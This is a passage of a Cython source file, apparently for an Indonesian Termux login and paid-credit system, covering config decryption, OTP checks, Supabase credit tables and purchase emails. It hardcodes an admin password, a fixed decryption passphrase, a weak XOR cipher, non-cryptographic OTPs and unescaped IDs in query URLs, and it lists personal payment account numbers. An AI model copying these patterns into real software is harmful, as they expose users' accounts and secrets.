# cython: language_level=3
import json
import os
import re
import getpass
import requests
import smtplib
import random
import time
import sys
import base64
import hashlib
import platform
import subprocess
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from tqdm import tqdm
from simple_term_menu import TerminalMenu
from rich.table import Table
from rich.console import Console
from rich.panel import Panel
from tabulate import tabulate
from fake_useragent import UserAgent

cdef str CONFIG_FILE = "config.enc"
cdef str CONFIG_FILE_PLAIN = "config.json"
cdef str OTP_FILE = "otp_data.json"
cdef int OTP_EXPIRY = 300
cdef int DEFAULT_CREDIT = 3

cdef str SUPABASE_URL = ""
cdef str SUPABASE_SERVICE_KEY = ""

cpdef void init_supabase_credit(str url, str service_key):
    global SUPABASE_URL, SUPABASE_SERVICE_KEY
    SUPABASE_URL = url
    SUPABASE_SERVICE_KEY = service_key

cdef bytes SALT = b"TermuxAuth2024SecureSalt"
cdef bytes PASSPHRASE = b"Tx@uth#Pr0t3ct3d$K3y!2024"

cdef str ADMIN_USERNAME = "xyraofficial"
cdef str ADMIN_PASSWORD = "admin"

cdef str strip_ansi_codes(str s):
    return re.sub(r'\x1b\[[0-9;]*m', '', s)

cdef int visible_width(str s):
    cdef str clean = re.sub(r'\x1b\[[0-9;]*m', '', s)
    cdef int width = 0
    cdef str ch
    for ch in clean:
        if ord(ch) > 0x1F00:
            width += 2
        else:
            width += 1
    return width

cdef bytes derive_key_internal(bytes passphrase, bytes salt):
    cdef bytes key = hashlib.pbkdf2_hmac('sha256', passphrase, salt, 100000)
    return base64.urlsafe_b64encode(key)

cdef bytes xor_decrypt(bytes data, bytes key):
    cdef bytearray result = bytearray()
    cdef bytes key_bytes = base64.urlsafe_b64decode(key)
    cdef int i
    cdef int byte
    for i in range(len(data)):
        byte = data[i] ^ key_bytes[i % len(key_bytes)]
        result.append(byte)
    return bytes(result)

cdef dict decrypt_config(bytes encrypted_data):
    cdef bytes header, enc_data, key, decrypted
    cdef str json_str
    
    if len(encrypted_data) < 8:
        return None
    
    header = encrypted_data[:8]
    enc_data = encrypted_data[8:]
    
    if header == b"TXAUTH02":
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=SALT,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(PASSPHRASE))
            f = Fernet(key)
            decrypted = f.decrypt(enc_data)
            json_str = decrypted.decode('utf-8')
            return json.loads(json_str)
        except:
            return None
    
    elif header == b"TXAUTH01":
        try:
            key = derive_key_internal(PASSPHRASE, SALT)
            enc_data = base64.urlsafe_b64decode(enc_data)
            decrypted = xor_decrypt(enc_data, key)
            json_str = decrypted.decode('utf-8')
            return json.loads(json_str)
        except:
            return None
    
    return None

cdef str R = '\033[0m'
cdef str B = '\033[1m'
cdef str D = '\033[2m'
cdef str RD = '\033[91m'
cdef str GR = '\033[92m'
cdef str YL = '\033[93m'
cdef str BL = '\033[94m'
cdef str MG = '\033[95m'
cdef str CY = '\033[96m'
cdef str WH = '\033[97m'
cdef str DRD = '\033[31m'
cdef str DGR = '\033[32m'
cdef str DYL = '\033[33m'

console = Console()

cpdef void play_beep():
    sys.stdout.write('\a')
    sys.stdout.flush()

cpdef void play_success_sound():
    for _ in range(1):
        sys.stdout.write('\a')
        sys.stdout.flush()
        time.sleep(0.1)

cpdef void play_error_sound():
    for _ in range(2):
        sys.stdout.write('\a')
        sys.stdout.flush()
        time.sleep(0.15)

cpdef void play_startup_sound():
    for _ in range(3):
        sys.stdout.write('\a')
        sys.stdout.flush()
        time.sleep(0.08)

cpdef void play_send_success_sound():
    sys.stdout.write('\a')
    sys.stdout.flush()

cpdef void play_send_fail_sound():
    for _ in range(2):
        sys.stdout.write('\a')
        sys.stdout.flush()
        time.sleep(0.1)

cpdef str get_greeting():
    cdef int hour = datetime.now().hour
    if 5 <= hour < 11:
        return "Selamat Pagi"
    elif 11 <= hour < 15:
        return "Selamat Siang"
    elif 15 <= hour < 18:
        return "Selamat Sore"
    else:
        return "Selamat Malam"

cpdef str getprop(str name):
    try:
        return subprocess.check_output(["getprop", name]).decode().strip()
    except:
        return "Unknown"

cpdef dict get_device_info():
    cdef str brand = getprop("ro.product.brand")
    cdef str model = getprop("ro.product.model")
    cdef str android = getprop("ro.build.version.release")
    cdef str arch = platform.machine()
    cdef str system = platform.system()
    
    if brand == "Unknown":
        return {
            "System": system,
            "Arch": arch,
            "Type": "PC/Server"
        }
    return {
        "Brand": brand,
        "Model": model,
        "Android": android
    }

cpdef str get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "N/A"

cpdef str get_day_name():
    cdef list days = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"]
    return days[datetime.now().weekday()]

cpdef str get_month_name():
    cdef list months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni",
                        "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
    return months[datetime.now().month - 1]

cpdef str get_date_str():
    cdef object now = datetime.now()
    return f"{get_day_name()}, {now.day:02d} {get_month_name()} {now.year}"

cpdef str get_time_str():
    cdef object now = datetime.now()
    return f"{now.hour:02d}:{now.minute:02d}:{now.second:02d} WIB"

cpdef void loading_tqdm(str desc, int steps=50):
    for i in tqdm(range(steps), desc=f"  {desc}", colour="green", 
                  bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}", ncols=50):
        time.sleep(0.05)
    print()

cpdef void clear():
    os.system('clear' if os.name == 'posix' else 'cls')

cpdef void print_info_table(dict dev_info, str user_ip):
    table = Table(
        title=f"[bold magenta]★[/bold magenta] [bold white]TERMUX AUTH SYSTEM[/bold white] [bold magenta]★[/bold magenta]",
        show_header=False,
        title_style="bold cyan",
        box=None
    )
    
    if "Brand" in dev_info:
        dev_content = (
            f"[bold cyan]Brand[/bold cyan]   : {dev_info['Brand']}\n"
            f"[bold cyan]Model[/bold cyan]   : {dev_info['Model']}\n"
            f"[bold cyan]Android[/bold cyan] : {dev_info['Android']}"
        )
    else:
        dev_content = (
            f"[bold cyan]System[/bold cyan] : {dev_info['System']}\n"
            f"[bold cyan]Arch[/bold cyan]   : {dev_info['Arch']}\n"
            f"[bold cyan]Type[/bold cyan]   : {dev_info['Type']}"
        )
    
    left_panel = Panel(
        dev_content,
        title="[bold cyan]DEVICE INFO[/bold cyan]",
        border_style="cyan"
    )
    
    user_content = (
        f"[bold green]IP[/bold green]      : {user_ip}\n"
        f"[bold green]Tanggal[/bold green] : {get_date_str()}\n"
        f"[bold green]Waktu[/bold green]   : {get_time_str()}"
    )
    
    right_panel = Panel(
        user_content,
        title="[bold green]USER INFO[/bold green]",
        border_style="green"
    )
    
    table.add_row(left_panel, right_panel)
    console.print(table)

cpdef void open_url(str url):
    try:
        if os.path.exists("/data/data/com.termux"):
            subprocess.run(["termux-open-url", url], check=False)
        else:
            subprocess.run(["xdg-open", url], check=False)
    except:
        info(f"Buka manual: {url}")

cpdef void show_developer_info():
    cdef int sel
    cdef list dev_links = [
        ("WhatsApp", "https://wa.me/62895325844493"),
        ("YouTube", "https://youtube.com/@Kz.tutorial"),
        ("Email", "mailto:xyraofficialsup@gmail.com"),
        ("GitHub", "https://github.com/XyraOfficial"),
    ]
    
    try:
        while True:
            clear()
            print()
            
            title_box = (
                f"\n{GR}{B}"
                f"╭───────────────────────────────╮\n"
                f"│       DEVELOPER INFO          │\n"
                f"│      by XyraOfficial          │\n"
                f"╰───────────────────────────────╯"
                f"{R}"
            )
            
            options = [
                f"{B}WhatsApp  - Hubungi via WA{R}",
                f"{B}YouTube   - Channel Tutorial{R}",
                f"{B}Email     - Kirim Email{R}",
                f"{B}GitHub    - Source Code{R}",
                f"{B}Kembali   - Menu Utama{R}",
            ]
            
            dev_menu = TerminalMenu(
                menu_entries=options,
                title=title_box,
                menu_cursor="▶ ",
                menu_cursor_style=("fg_red",),
                menu_highlight_style=("fg_yellow", "bold"),
            )
            
            sel = dev_menu.show()
            
            if sel is None or sel == 4:
                break
            elif sel >= 0 and sel < 4:
                name, url = dev_links[sel]
                loading_tqdm(f"Membuka {name}", 20)
                open_url(url)
                success(f"{name} dibuka!")
                print()
                input(f" {D}Tekan Enter...{R}")
    except KeyboardInterrupt:
        show_interrupt_message()
        raise SystemExit(0)

cpdef void section(str title):
    print()
    console.print(f"[bold green]┌─ {title} {'─' * (30 - len(title))}┐[/bold green]")
    print()

cpdef void success(str msg, bint with_sound=True):
    console.print(f" [bold green][✓][/bold green] {msg}")
    if with_sound:
        play_success_sound()

cpdef void error(str msg, bint with_sound=True):
    console.print(f" [bold red][✗][/bold red] {msg}")
    if with_sound:
        play_error_sound()

cpdef void info(str msg):
    console.print(f" [bold yellow][!][/bold yellow] {msg}")

cpdef void warning(str msg):
    console.print(f" [bold orange1][⚠][/bold orange1] {msg}")

cpdef void box_info(list lines):
    content = "\n".join(lines)
    panel = Panel(content, border_style="dim")
    console.print(panel)

cpdef dict load_config():
    cdef bytes enc_data
    cdef dict cfg
    
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'rb') as f:
            enc_data = f.read()
        cfg = decrypt_config(enc_data)
        if cfg is not None:
            return cfg
        error("Gagal dekripsi config!")
        return None
    
    if os.path.exists(CONFIG_FILE_PLAIN):
        info("Menggunakan config.json (tidak aman)")
        info("Gunakan encrypt_config.py untuk enkripsi")
        with open(CONFIG_FILE_PLAIN, 'r') as f:
            return json.load(f)
    
    error("File config tidak ditemukan!")
    error("Butuh config.enc atau config.json")
    return None

cpdef bint valid_email(str e):
    return bool(re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', e))

cpdef tuple valid_pass(str p):
    if len(p) >= 6:
        return (True, "")
    return (False, "Min 6 karakter")

cpdef str gen_otp():
    return str(random.randint(100000, 999999))

cpdef void save_otp(str email, str otp):
    cdef dict data = {}
    if os.path.exists(OTP_FILE):
        with open(OTP_FILE, 'r') as f:
            data = json.load(f)
    data[email] = {"otp": otp, "time": time.time()}
    with open(OTP_FILE, 'w') as f:
        json.dump(data, f)

cpdef tuple check_otp(str email, str code):
    cdef dict data
    if not os.path.exists(OTP_FILE):
        return (False, "OTP tidak ada")
    with open(OTP_FILE, 'r') as f:
        data = json.load(f)
    if email not in data:
        return (False, "OTP tidak ditemukan")
    if time.time() - data[email]["time"] > OTP_EXPIRY:
        del data[email]
        with open(OTP_FILE, 'w') as f:
            json.dump(data, f)
        return (False, "OTP expired")
    if data[email]["otp"] != code:
        return (False, "Kode salah")
    del data[email]
    with open(OTP_FILE, 'w') as f:
        json.dump(data, f)
    return (True, "Valid")

cpdef dict _supabase_headers():
    return {
        "apikey": SUPABASE_SERVICE_KEY,
        "Authorization": f"Bearer {SUPABASE_SERVICE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=representation"
    }

cpdef dict _get_user_credit_data(str user_id):
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/user_credits?user_id=eq.{user_id}"
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data and len(data) > 0:
                return data[0]
        return None
    except:
        return None

cpdef bint _create_user_credit(str user_id, int credit, int used):
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/user_credits"
    cdef dict payload = {"user_id": user_id, "credit": credit, "used": used}
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code in [200, 201]
    except:
        return False

cpdef bint _update_user_credit(str user_id, int credit, int used):
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/user_credits?user_id=eq.{user_id}"
    cdef dict payload = {"credit": credit, "used": used}
    try:
        r = requests.patch(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200
    except:
        return False

cpdef int get_user_credit(str user_id):
    cdef dict data = _get_user_credit_data(user_id)
    if data is None:
        _create_user_credit(user_id, DEFAULT_CREDIT, 0)
        return DEFAULT_CREDIT
    return data.get("credit", DEFAULT_CREDIT)

cpdef int get_user_used(str user_id):
    cdef dict data = _get_user_credit_data(user_id)
    if data is None:
        return 0
    return data.get("used", 0)

cpdef bint use_credit(str user_id, int amount=1):
    cdef dict data = _get_user_credit_data(user_id)
    cdef int current_credit, current_used
    
    if data is None:
        _create_user_credit(user_id, DEFAULT_CREDIT, 0)
        data = {"credit": DEFAULT_CREDIT, "used": 0}
    
    current_credit = data.get("credit", DEFAULT_CREDIT)
    current_used = data.get("used", 0)
    
    if current_credit < amount:
        return False
    
    _update_user_credit(user_id, current_credit - amount, current_used + amount)
    return True

cpdef void add_credit(str user_id, int amount):
    cdef dict data = _get_user_credit_data(user_id)
    cdef int current_credit, current_used
    
    if data is None:
        _create_user_credit(user_id, DEFAULT_CREDIT + amount, 0)
        return
    
    current_credit = data.get("credit", DEFAULT_CREDIT)
    current_used = data.get("used", 0)
    _update_user_credit(user_id, current_credit + amount, current_used)

cpdef void remove_credit(str user_id, int amount):
    cdef dict data = _get_user_credit_data(user_id)
    cdef int current_credit, current_used
    
    if data is None:
        _create_user_credit(user_id, max(0, DEFAULT_CREDIT - amount), 0)
        return
    
    current_credit = data.get("credit", DEFAULT_CREDIT)
    current_used = data.get("used", 0)
    _update_user_credit(user_id, max(0, current_credit - amount), current_used)

cpdef void set_credit(str user_id, int amount):
    cdef dict data = _get_user_credit_data(user_id)
    
    if data is None:
        _create_user_credit(user_id, max(0, amount), 0)
        return
    
    _update_user_credit(user_id, max(0, amount), data.get("used", 0))

cpdef void reset_user_credit(str user_id):
    cdef dict data = _get_user_credit_data(user_id)
    
    if data is None:
        _create_user_credit(user_id, DEFAULT_CREDIT, 0)
        return
    
    _update_user_credit(user_id, DEFAULT_CREDIT, 0)

cpdef dict get_all_credits():
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/user_credits"
    cdef dict result = {}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            for item in data:
                user_id = item.get("user_id", "")
                if user_id:
                    result[user_id] = {"credit": item.get("credit", 0), "used": item.get("used", 0)}
        return result
    except:
        return {}

cdef int CREDIT_PRICE = 1000
cdef int CREDIT_FEE = 500
cdef int DISCOUNT_THRESHOLD = 10
cdef int DISCOUNT_PERCENT = 10

cdef str OWNER_DANA = "0895325844493"
cdef str OWNER_OVO = "0895325844493"
cdef str OWNER_SEABANK = "901087597707"
cdef str ADMIN_WA = "62895325844493"
cdef str ADMIN_EMAIL = "xyraofficialsup@gmail.com"

cpdef tuple calculate_credit_price(int credit_amount):
    cdef int base_price = credit_amount * CREDIT_PRICE
    cdef int discount = 0
    cdef int discount_amount = 0
    
    if credit_amount >= DISCOUNT_THRESHOLD:
        discount = DISCOUNT_PERCENT
        discount_amount = (base_price * discount) // 100
    
    cdef int subtotal = base_price - discount_amount
    cdef int total = subtotal + CREDIT_FEE
    
    return (base_price, discount, discount_amount, CREDIT_FEE, total)

cpdef tuple save_credit_purchase(str user_id, str user_email, int credit_amount, int total_amount, str payment_method):
    import uuid
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/credit_purchases"
    cdef str purchase_id = f"PUR-{user_id[:8]}-{int(time.time())}"
    cdef dict payload = {
        "id": purchase_id,
        "user_id": user_id,
        "user_email": user_email,
        "credit_amount": credit_amount,
        "total_amount": total_amount,
        "payment_method": payment_method,
        "status": "pending"
    }
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=15)
        if r.status_code in [200, 201]:
            return (True, purchase_id)
        elif r.status_code == 404:
            return (False, "Tabel credit_purchases belum dibuat di Supabase")
        elif r.status_code == 401 or r.status_code == 403:
            return (False, "Akses ditolak - periksa service key")
        elif r.status_code == 409:
            return (False, "ID pesanan sudah ada")
        else:
            try:
                err_msg = r.json().get("message", r.text[:100])
            except:
                err_msg = f"HTTP {r.status_code}"
            return (False, err_msg)
    except requests.exceptions.Timeout:
        return (False, "Koneksi timeout")
    except requests.exceptions.ConnectionError:
        return (False, "Tidak dapat terhubung ke server")
    except Exception as e:
        return (False, str(e)[:100])

cpdef list get_pending_purchases():
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/credit_purchases?status=eq.pending&order=created_at.desc"
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json()
        return []
    except:
        return []

cpdef list get_all_purchases():
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/credit_purchases?order=created_at.desc"
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json()
        return []
    except:
        return []

cpdef list get_user_purchases(str user_id):
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/credit_purchases?user_id=eq.{user_id}&order=created_at.desc"
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json()
        return []
    except:
        return []

cpdef bint update_purchase_status(str purchase_id, str status):
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/credit_purchases?id=eq.{purchase_id}"
    cdef dict payload = {"status": status}
    try:
        r = requests.patch(url, json=payload, headers=headers, timeout=10)
        return r.status_code in [200, 204]
    except:
        return False

cpdef dict get_purchase_by_id(str purchase_id):
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/credit_purchases?id=eq.{purchase_id}"
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data and len(data) > 0:
                return data[0]
        return None
    except:
        return None

cpdef str purchase_confirmation_template(str user_email, int credit_amount, int total_amount, str payment_method, str purchase_id):
    return f'''<!DOCTYPE html><html><body style="margin:0;padding:0;font-family:Arial;background:#0f0f23">
<table style="width:100%"><tr><td align="center" style="padding:40px 0">
<table style="max-width:550px;background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:20px;overflow:hidden">
<tr><td style="padding:40px;text-align:center">
<div style="font-size:50px;margin-bottom:20px">💳</div>
<h1 style="color:#fff;margin:0">Pembelian Credit</h1>
<p style="color:#888;margin:10px 0 30px">Termux Auth System</p>
<div style="background:rgba(255,255,255,0.1);border-radius:16px;padding:25px;text-align:left">
<p style="color:#4ecdc4;margin:0 0 15px;font-size:14px">📋 DETAIL PESANAN</p>
<table style="width:100%;color:#fff;font-size:14px">
<tr><td style="padding:8px 0;color:#888">ID Pesanan</td><td style="padding:8px 0;text-align:right">{purchase_id}</td></tr>
<tr><td style="padding:8px 0;color:#888">Email</td><td style="padding:8px 0;text-align:right">{user_email}</td></tr>
<tr><td style="padding:8px 0;color:#888">Jumlah Credit</td><td style="padding:8px 0;text-align:right;color:#f6ad55">{credit_amount} Credit</td></tr>
<tr><td style="padding:8px 0;color:#888">Metode</td><td style="padding:8px 0;text-align:right">{payment_method}</td></tr>
<tr style="border-top:1px solid rgba(255,255,255,0.1)"><td style="padding:15px 0 8px;color:#4ecdc4;font-weight:bold">TOTAL</td><td style="padding:15px 0 8px;text-align:right;color:#4ecdc4;font-weight:bold;font-size:18px">Rp{total_amount:,}</td></tr>
</table>
</div>
<p style="color:#f6ad55;margin:30px 0 15px">⏳ Menunggu Konfirmasi Admin</p>
<p style="color:#888;font-size:13px;margin:0">Kirim bukti pembayaran ke WhatsApp/Email admin untuk verifikasi</p>
</td></tr>
<tr><td style="padding:20px;background:rgba(0,0,0,0.2);text-align:center">
<p style="color:#666;font-size:12px;margin:0">Termux Auth System - by XyraOfficial</p>
</td></tr></table></td></tr></table></body></html>'''

cpdef str admin_notification_template(str user_email, int credit_amount, int total_amount, str payment_method, str purchase_id):
    return f'''<!DOCTYPE html><html><body style="margin:0;padding:0;font-family:Arial;background:#0f0f23">
<table style="width:100%"><tr><td align="center" style="padding:40px 0">
<table style="max-width:550px;background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:20px;overflow:hidden">
<tr><td style="padding:40px;text-align:center">
<div style="font-size:50px;margin-bottom:20px">🔔</div>
<h1 style="color:#fff;margin:0">Notifikasi Pembelian</h1>
<p style="color:#f6ad55;margin:10px 0 30px">Ada pesanan baru menunggu approval!</p>
<div style="background:rgba(255,255,255,0.1);border-radius:16px;padding:25px;text-align:left">
<p style="color:#4ecdc4;margin:0 0 15px;font-size:14px">📋 DETAIL PESANAN</p>
<table style="width:100%;color:#fff;font-size:14px">
<tr><td style="padding:8px 0;color:#888">ID Pesanan</td><td style="padding:8px 0;text-align:right;font-family:monospace">{purchase_id}</td></tr>
<tr><td style="padding:8px 0;color:#888">Email User</td><td style="padding:8px 0;text-align:right">{user_email}</td></tr>
<tr><td style="padding:8px 0;color:#888">Jumlah Credit</td><td style="padding:8px 0;text-align:right;color:#f6ad55;font-weight:bold">{credit_amount} Credit</td></tr>
<tr><td style="padding:8px 0;color:#888">Metode Pembayaran</td><td style="padding:8px 0;text-align:right">{payment_method}</td></tr>
<tr style="border-top:1px solid rgba(255,255,255,0.1)"><td style="padding:15px 0 8px;color:#4ecdc4;font-weight:bold">TOTAL BAYAR</td><td style="padding:15px 0 8px;text-align:right;color:#4ecdc4;font-weight:bold;font-size:20px">Rp{total_amount:,}</td></tr>
</table>
</div>
<p style="color:#888;font-size:14px;margin:30px 0 20px">Login ke Admin Panel untuk approve/reject pesanan ini</p>
<div style="background:rgba(76,175,80,0.2);border:1px solid rgba(76,175,80,0.5);border-radius:10px;padding:15px;margin-top:10px">
<p style="color:#81c784;margin:0;font-size:13px">💡 Cek bukti pembayaran dari user sebelum approve</p>
</div>
</td></tr>
<tr><td style="padding:20px;background:rgba(0,0,0,0.2);text-align:center">
<p style="color:#666;font-size:12px;margin:0">Termux Auth System Admin</p>
</td></tr></table></td></tr></table></body></html>'''

cpdef str purchase_status_template(str user_email, int credit_amount, int total_amount, str status, str purchase_id):
    cdef str icon = "✅" if status == "approved" else "❌"
    cdef str title = "Pembelian Disetujui!" if status == "approved" else "Pembelian Ditolak"
    cdef str message = f"Credit sebanyak {credit_amount} telah ditambahkan ke akun Anda." if status == "approved" else "Maaf, pembelian Anda tidak dapat diproses. Silakan hubungi admin untuk info lebih lanjut."
    cdef str color = "#4ecdc4" if status == "approved" else "#ff6b6b"
    
    return f'''<!DOCTYPE html><html><body style="margin:0;padding:0;font-family:Arial;background:#0f0f23">
<table style="width:100%"><tr><td align="center" style="padding:40px 0">
<table style="max-width:550px;background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:20px;overflow:hidden">
<tr><td style="padding:40px;text-align:center">
<div style="font-size:60px;margin-bottom:20px">{icon}</div>
<h1 style="color:{color};margin:0">{title}</h1>
<p style="color:#888;margin:10px 0 30px">ID: {purchase_id}</p>
<div style="background:rgba(255,255,255,0.1);border-radius:16px;padding:25px">
<p style="color:#fff;font-size:16px;margin:0 0 20px">{message}</p>
<table style="width:100%;color:#fff;font-size:14px">
<tr><td style="padding:8px 0;color:#888">Jumlah Credit</td><td style="padding:8px 0;text-align:right;color:#f6ad55">{credit_amount} Credit</td></tr>
<tr><td style="padding:8px 0;color:#888">Total Bayar</td><td style="padding:8px 0;text-align:right">Rp{total_amount:,}</td></tr>
</table>
</div>
</td></tr>
<tr><td style="padding:20px;background:rgba(0,0,0,0.2);text-align:center">
<p style="color:#666;font-size:12px;margin:0">Termux Auth System - by XyraOfficial</p>
</td></tr></table></td></tr></table></body></html>'''

cpdef tuple send_purchase_email(dict cfg, str to, str subject, str html_content):
    cdef str smtp_email = cfg.get("smtp_email", "")
    cdef str smtp_pass = cfg.get("smtp_app_password", "")
    if not smtp_email or not smtp_pass:
        return (False, "SMTP tidak dikonfigurasi")
    try:
        msg = MIMEMultipart('alternative')
        msg['Subject'] = subject
        msg['From'] = f'Termux Auth <{smtp_email}>'
        msg['To'] = to
        msg.attach(MIMEText(html_content, 'html'))
        srv = smtplib.SMTP('smtp.gmail.com', 587)
        srv.starttls()
        srv.login(smtp_email, smtp_pass)
        srv.sendmail(smtp_email, to, msg.as_string())
        srv.quit()
        return (True, "Email terkirim!")
    except smtplib.SMTPAuthenticationError:
        return (False, "Login SMTP gagal")
    except Exception as e:
        return (False, str(e))

cpdef void show_buy_credit_menu(dict cfg, str user_id, str user_email):
    cdef int sel, credit_amount
    cdef bint ok
    cdef str credit_input, method_choice
    cdef int base_price, discount, discount_amount, fee, total
    
    try:
        while True:
            clear()
            print()
            
            credit = get_user_credit(user_id)
            used = get_user_used(user_id)
            
            credit_panel = Panel(
                f"[bold cyan]Credit Saat Ini[/bold cyan]: [bold white]{credit}[/bold white]\n"
                f"[bold yellow]Total Digunakan[/bold yellow]: [bold white]{used}[/bold white]",
                border_style="cyan",
                title="[bold white]💰 CREDIT INFO[/bold white]"
            )
            console.print(credit_panel)
            
            price_info = (
                f"[bold white]HARGA CREDIT[/bold white]\n\n"
                f"[bold cyan]•[/bold cyan] 1 Credit = [bold green]Rp{CREDIT_PRICE:,}[/bold green]\n"
                f"[bold cyan]•[/bold cyan] Fee Admin = [bold yellow]Rp{CREDIT_FEE:,}[/bold yellow]\n"
                f"[bold cyan]•[/bold cyan] Diskon {DISCOUNT_PERCENT}% jika beli >= {DISCOUNT_THRESHOLD} Credit\n\n"
                f"[dim]Contoh: 10 Credit = (10 x 1000) - 10% + 500 = Rp9.500[/dim]"
            )
            console.print(Panel(price_info, border_style="green", title="[bold green]💵 INFO HARGA[/bold green]"))
            
            title_box = f"\n{GR}{B}╭───────────────────────────────────╮\n│                                   │\n│       B U Y   C R E D I T         │\n│                                   │\n╰───────────────────────────────────╯{R}"
            
            options = [
                f"{B}  [1]  Beli Credit   -  Masukkan jumlah{R}",
                f"{B}  [2]  Riwayat       -  Lihat pembelian{R}",
                f"{B}  [0]  Kembali       -  User menu{R}",
            ]
            
            buy_menu = TerminalMenu(
                menu_entries=options,
                title=title_box,
                menu_cursor=" ▶ ",
                menu_cursor_style=("fg_green", "bold"),
                menu_highlight_style=("fg_cyan", "bold"),
            )
            
            sel = buy_menu.show()
            
            if sel == 0:
                clear()
                print()
                section("BELI CREDIT")
                
                print(f" {YL}[!]{R} Masukkan jumlah credit yang ingin dibeli")
                print(f" {YL}[!]{R} Minimal: 1 Credit | Diskon jika >= {DISCOUNT_THRESHOLD} Credit")
                print()
                
                credit_input = input(f" {GR}[?]{R} Jumlah Credit : {CY}").strip()
                print(R, end="")
                
                try:
                    credit_amount = int(credit_input)
                    if credit_amount < 1:
                        error("Minimal 1 credit!")
                        input(f"\n {D}Tekan Enter...{R}")
                        continue
                except:
                    error("Input harus berupa angka!")
                    input(f"\n {D}Tekan Enter...{R}")
                    continue
                
                base_price, discount, discount_amount, fee, total = calculate_credit_price(credit_amount)
                
                print()
                price_detail = (
                    f"[bold white]RINCIAN HARGA[/bold white]\n\n"
                    f"[bold cyan]Jumlah Credit[/bold cyan]  : [bold white]{credit_amount}[/bold white] Credit\n"
                    f"[bold cyan]Harga Dasar[/bold cyan]    : [bold white]Rp{base_price:,}[/bold white]\n"
                )
                if discount > 0:
                    price_detail += f"[bold green]Diskon {discount}%[/bold green]     : [bold green]-Rp{discount_amount:,}[/bold green]\n"
                price_detail += (
                    f"[bold yellow]Fee Admin[/bold yellow]      : [bold yellow]+Rp{fee:,}[/bold yellow]\n"
                    f"[dim]─────────────────────────────[/dim]\n"
                    f"[bold cyan]TOTAL BAYAR[/bold cyan]    : [bold green]Rp{total:,}[/bold green]"
                )
                console.print(Panel(price_detail, border_style="cyan", title="[bold cyan]🧾 INVOICE[/bold cyan]"))
                
                print()
                print(f" {GR}{B}METODE PEMBAYARAN:{R}")
                print()
                
                payment_options = [
                    f"{B}  [1]  Dana     -  {OWNER_DANA}{R}",
                    f"{B}  [2]  OVO      -  {OWNER_OVO}{R}",
                    f"{B}  [3]  SeaBank  -  {OWNER_SEABANK}{R}",
                    f"{B}  [0]  Batal{R}",
                ]
                
                payment_menu = TerminalMenu(
                    menu_entries=payment_options,
                    title=f"\n{CY}  Pilih metode:{R}",
                    menu_cursor=" ▶ ",
                    menu_cursor_style=("fg_green", "bold"),
                    menu_highlight_style=("fg_cyan", "bold"),
                )
                
                method_sel = payment_menu.show()
                
                if method_sel is None or method_sel == 3:
                    info("Dibatalkan")
                    input(f"\n {D}Tekan Enter...{R}")
                    continue
                
                if method_sel == 0:
                    method_choice = "Dana"
                    account_number = OWNER_DANA
                elif method_sel == 1:
                    method_choice = "OVO"
                    account_number = OWNER_OVO
                else:
                    method_choice = "SeaBank"
                    account_number = OWNER_SEABANK
                
                print()
                loading_tqdm("Menyimpan pesanan", 30)
                
                ok, result = save_credit_purchase(user_id, user_email, credit_amount, total, method_choice)
                
                if ok and result:
                    purchase_id = result
                    send_purchase_email(cfg, user_email, f"💳 Pesanan Credit #{purchase_id[:15]}",
                        purchase_confirmation_template(user_email, credit_amount, total, method_choice, purchase_id))
                    
                    send_purchase_email(cfg, ADMIN_EMAIL, f"🔔 Pesanan Baru: {credit_amount} Credit dari {user_email}",
                        admin_notification_template(user_email, credit_amount, total, method_choice, purchase_id))
                    
                    success("Pesanan berhasil dibuat!")
                    print()
                    
                    instruction = (
                        f"[bold white]INSTRUKSI PEMBAYARAN[/bold white]\n\n"
                        f"[bold cyan]1.[/bold cyan] Transfer [bold green]Rp{total:,}[/bold green] ke:\n"
                        f"   [bold yellow]{method_choice}[/bold yellow]: [bold white]{account_number}[/bold white]\n\n"
                        f"[bold cyan]2.[/bold cyan] Kirim bukti pembayaran ke:\n"
                        f"   [bold green]WhatsApp[/bold green]: {ADMIN_WA}\n"
